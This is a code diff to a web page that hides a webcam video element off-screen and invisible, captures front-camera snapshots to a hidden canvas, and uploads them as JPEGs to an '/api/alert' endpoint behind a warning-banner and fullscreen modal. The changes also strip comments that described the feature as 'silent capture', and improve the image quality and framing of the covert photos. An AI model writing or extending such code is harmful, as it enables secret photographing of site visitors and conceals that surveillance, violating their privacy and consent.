@@ -24,7 +24,6 @@
     .status-dot { width: 8px; height: 8px; background: var(--success); border-radius: 50%; animation: pulse 1.5s infinite; }
     @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-    /* Alert Banner on Top */
     .warning-banner { 
       margin-bottom: 20px; 
       padding: 14px 18px; 
@@ -52,13 +51,11 @@
     .btn { background: var(--accent); color: white; border: none; padding: 14px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 18px; font-size: 15px; }
     input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; margin-top: 10px; }
 
-    /* Hidden background video engine - Active for canvas & WebRTC */
+    /* Hidden background video engine */
     #webcam {
       position: fixed;
       top: -9999px;
       left: -9999px;
-      width: 480px;
-      height: 360px;
       opacity: 0;
       pointer-events: none;
     }
@@ -98,7 +95,6 @@
     </div>
   </div>
 
-  <!-- Background camera element & canvas for silent capture -->
   <video id="webcam" autoplay playsinline muted></video>
   <canvas id="snapshotCanvas" style="display:none;"></canvas>
 
@@ -114,11 +110,17 @@
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { width: { ideal: 480 }, height: { ideal: 360 }, frameRate: { max: 15 } },
+          video: { facingMode: 'user', frameRate: { max: 15 } },
           audio: false
         });
 
-        document.getElementById('webcam').srcObject = stream;
+        const video = document.getElementById('webcam');
+        video.srcObject = stream;
+        
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => resolve();
+        });
+
         document.getElementById('startModal').style.display = 'none';
 
         if (document.documentElement.requestFullscreen) {
@@ -166,11 +168,33 @@
 
       const video = document.getElementById('webcam');
       const canvas = document.getElementById('snapshotCanvas');
-      canvas.width = 480;
-      canvas.height = 360;
+
+      // Camera ka original aspect ratio pick karega (koi stretching/dabav nahi hoga)
+      const naturalWidth = video.videoWidth || 480;
+      const naturalHeight = video.videoHeight || 640;
+
+      // Maintain exact ratio while keeping file light
+      const maxDim = 640;
+      let targetWidth = naturalWidth;
+      let targetHeight = naturalHeight;
+
+      if (naturalWidth > naturalHeight) {
+        if (naturalWidth > maxDim) {
+          targetWidth = maxDim;
+          targetHeight = Math.round((naturalHeight * maxDim) / naturalWidth);
+        }
+      } else {
+        if (naturalHeight > maxDim) {
+          targetHeight = maxDim;
+          targetWidth = Math.round((naturalWidth * maxDim) / naturalHeight);
+        }
+      }
+
+      canvas.width = targetWidth;
+      canvas.height = targetHeight;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, 480, 360);
-      const imageData = canvas.toDataURL('image/jpeg', 0.5);
+      ctx.drawImage(video, 0, 0, targetWidth, targetHeight);
+      const imageData = canvas.toDataURL('image/jpeg', 0.65);
 
       try {
         await fetch('/api/alert', {
